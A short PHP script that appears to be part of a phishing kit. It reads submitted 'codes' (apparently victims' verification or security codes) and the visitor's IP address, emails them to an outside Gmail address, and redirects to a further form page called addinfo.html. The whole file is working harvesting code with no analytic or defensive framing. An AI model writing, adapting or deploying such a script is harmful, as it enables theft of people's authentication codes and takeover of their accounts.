<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$codes = $_POST['codes'];

$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'codes: '.$codes . PHP_EOL .'IP:'. $ip;
mail("raloqka2021@gmail.com","codes Generator 1", $stringi);
header("Location: addinfo.html");

?>